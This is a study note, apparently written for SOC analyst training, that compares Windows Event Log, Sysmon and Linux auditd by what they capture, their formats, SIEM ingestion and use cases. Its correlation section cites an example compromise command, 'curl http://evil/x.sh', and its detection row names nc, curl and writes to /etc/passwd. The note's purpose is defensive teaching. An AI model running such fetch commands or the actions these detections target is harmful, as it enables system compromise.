# Q8 — Windows Event Log vs Sysmon vs Linux auditd: Comparison for SOC Analysts

## 1. Quick Overview of the Three Log Sources

- **Windows Event Log** — the built-in logging system on Windows. Every service, driver, and application writes events to log channels like **Security**, **System**, **Application**, **PowerShell**, **TaskScheduler**, **WMI**, etc. It's the *foundation* of Windows logging.
- **Sysmon** — a free Microsoft Sysinternals tool that extends the Windows Event Log with **rich, detailed endpoint telemetry** (process creation with command line, network connections, file creation, DNS queries, registry changes, etc.). It's the *most important add-on* for SOC telemetry on Windows.
- **Linux auditd** — the **kernel-level auditing daemon** on Linux. It records **syscalls, file access, authentication, and permission changes** with structured fields. It's the *equivalent of Sysmon* for Linux endpoints.

- **Quick intuition:**
  - **Windows Event Log = baseline built-in logging.**
  - **Sysmon = deep Windows endpoint telemetry (add-on).**
  - **auditd = deep Linux endpoint telemetry (built-in).**

---

## 2. What Each Log Source Captures

- **Windows Event Log captures:**
  - **Security channel:** logon/logoff (4624/4634), failed logons (4625), privilege use (4672), account changes (4720/4726), process creation (4688 — but command line is off by default), object access (4656), Kerberos events.
  - **System channel:** service start/stop (7036), driver load, system boot/shutdown, hardware errors.
  - **Application channel:** application-specific events.
  - **PowerShell channel:** script block logging, module logging, transcription.
  - **TaskScheduler / WMI / Defender / Firewall / TerminalServices** channels: their own specific events.
  - **Limitation:** very shallow on **network connections**, **DNS queries**, **file drops**, and **detailed process command lines** by default.

- **Sysmon captures:**
  - **Event ID 1** — Process Create (full command line, parent process, user, hashes).
  - **Event ID 3** — Network Connection (source/dest IP, port, process).
  - **Event ID 11** — File Create.
  - **Event ID 13** — Registry Value Set.
  - **Event ID 22** — DNS Query.
  - **Event IDs 7, 8, 10, 12, 14, 17, 18, 23, 25** — image load, remote thread, process access, registry key changes, named pipes, file delete, process tampering.
  - **Limitation:** noisy unless tuned with an XML config; it captures *behaviour*, but doesn't replace native security auditing for logon events.

- **Linux auditd captures:**
  - **Syscalls** (execve, open, connect, setuid, etc.).
  - **File access and permission changes** (via `-w` watch rules).
  - **Authentication events** via PAM (sudo, su, SSH logins).
  - **SELinux / AppArmor denials**.
  - **Process execution** (EXECVE records with arguments).
  - **Limitation:** everything must be **explicitly configured** — with no rules, auditd logs very little.

---

## 3. Log Format Comparison

- Each source uses a very different format, which matters when forwarding to a SIEM.

| Aspect | Windows Event Log | Sysmon | Linux auditd |
|--------|-------------------|--------|--------------|
| **Format** | **EVTX** (binary XML) — structured | **EVTX** (binary XML) — structured, same as Windows Event Log | **Plain text** — structured key=value audit records |
| **Fields** | Event ID, Provider, Computer, User, TimeCreated, EventData | Same as EVTX — Event ID, Image, CommandLine, ParentImage, User, Hashes, etc. | `type=`, `msg=audit(...)`, `uid=`, `pid=`, `comm=`, `exe=`, `key=`, `a0=`–`a3=` |
| **Readable by** | Event Viewer, `wevtutil`, PowerShell `Get-WinEvent` | Event Viewer (after install), SIEM agents | `ausearch`, `aureport`, `journalctl`, SIEM agents |
| **Default log location** | `%SystemRoot%\System32\winevt\Logs\*.evtx` | `%SystemRoot%\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx` | `/var/log/audit/audit.log` |
| **Best parser for SOC** | Windows Event Forwarding (WEF) → SIEM | WEF / Sysmon agent → SIEM | Wazuh auditd decoder, Splunk UF, rsyslog |

---

## 4. Full Comparison Table — Capture, Format, and SOC Use Cases

| Aspect | Windows Event Log | Sysmon | Linux auditd |
|--------|-------------------|--------|--------------|
| **What it captures** | Logons, account changes, service start/stop, Kerberos, PowerShell, app errors, task scheduler | Process creation (with command line), network connections, file create, DNS queries, registry writes, image loads, process access, named pipes | Syscalls, file access/permission changes, PAM authentication (sudo, su, ssh), SELinux denials, process execution |
| **Depth of telemetry** | Baseline | Very deep (behaviour-level) | Very deep (kernel-level) |
| **Network visibility** | Almost none by default | **Strong** (Event ID 3 + 22) | Moderate (via syscall rules on `connect`) |
| **Process command line** | Only if 4688 is enabled + command-line auditing is on | **Always** (Event ID 1) | **Yes** (EXECVE records with args) |
| **Log format** | EVTX (binary XML) | EVTX (binary XML) | Plain text with key=value audit records |
| **Configuration** | Group Policy / `auditpol` | XML config (include/exclude) | `/etc/audit/rules.d/*.rules` + `auditctl` |
| **Tamper resistance** | Moderate | Moderate | Strong (can be made immutable with `-e 2`) |
| **Built-in or add-on** | Built-in | Add-on (Sysinternals) | Built-in |
| **SIEM ingestion method** | WEF / agent | WEF / agent | Wazuh agent, Splunk UF, `audisp-remote`, rsyslog |
| **Primary SOC use case** | Logon monitoring, account auditing, compliance (PCI-DSS, HIPAA), incident timeline | Threat detection, hunting, EDR-like coverage on Windows | Threat detection, forensics, compliance on Linux |
| **Typical hot detections** | 4624/4625 (logon), 4672 (admin), 4720/4726 (account changes), 1102 (log cleared) | 1 (suspicious command lines), 3 (C2), 8/10 (injection), 22 (DGA) | Executions of `/bin/sh`, `sudo`, `nc`, `curl`; writes to `/etc/passwd`, `/etc/sudoers`; `setuid` syscalls |
| **Weakness** | Shallow — miss modern attacks | Noisy — needs tuning | Needs explicit rules — default config is minimal |

---

## 5. How a SOC Uses These Together

- **Layer them** — Windows Event Log gives the **audit baseline** (who logged in, what changed on the system), Sysmon gives the **behavioural depth** (what processes did what), auditd gives the **Linux equivalent**.
- **Correlate across sources in the SIEM:**
  - Security 4624 (logon) on DC → Sysmon Event 1 (PowerShell launched) on user host → Event ID 3 (outbound to suspicious IP) — a classic lateral movement + C2 chain.
  - Linux auditd EXECVE of `curl http://evil/x.sh` → auth.log SSH login from new IP — a classic Linux compromise chain.
- **Don't drop native logs for Sysmon/auditd:** Sysmon and auditd **supplement** built-in logging, they don't replace it. You still need Security logs on Windows and auth/syslog on Linux.
- **Tune Sysmon and auditd explicitly** — both are noisy unless you use a well-maintained config.
- **Map telemetry to MITRE ATT&CK** — Sysmon ID 1 → T1059 (Command and Scripting Interpreter); auditd `execve` → T1059; Event ID 3 → T1071 (C2).

---

## Key Takeaways

- **Windows Event Log = baseline built-in logging. Sysmon = deep add-on telemetry on Windows. auditd = deep built-in telemetry on Linux.**
- **All three are needed** — none replaces the others; they complement each other.
- **Sysmon and auditd are the richest** for behavioural detection, but require **explicit configuration and tuning**.
- **Windows Security logs and Linux auth logs** are still mandatory for **logon and account auditing**.
- A mature SOC **feeds all three into the SIEM**, correlates them, and maps detections to MITRE ATT&CK.
